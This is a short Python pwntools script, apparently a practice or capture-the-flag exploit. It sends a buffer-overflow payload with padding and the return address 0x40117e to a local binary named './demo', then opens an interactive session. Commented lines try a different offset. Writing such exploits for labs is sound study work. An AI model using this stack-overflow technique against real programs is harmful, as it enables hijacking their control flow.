#!/usr/bin/env python3
from pwn import *

p = process('./demo')
pause()
payload  = b'a'*10 
payload += p64(0) 
payload += p64(0x40117e)
payload += b"\n"

p.send(payload)
print(payload)
#offset=b'a'*0x18
#p.sendline(offset.decode('utf8')+payload.decode('utf8'))
p.interactive()
